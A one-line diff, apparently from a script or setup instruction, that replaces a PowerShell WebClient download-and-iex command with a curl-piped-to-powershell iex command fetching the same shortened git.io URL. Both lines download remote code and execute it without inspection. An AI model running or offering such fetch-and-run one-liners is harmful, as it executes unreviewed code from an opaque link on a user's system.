@@ -1,1 +1,1 @@
-start powershell.exe iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JDvI3'))
+curl 'https://git.io/JDvI3' | powershell iex
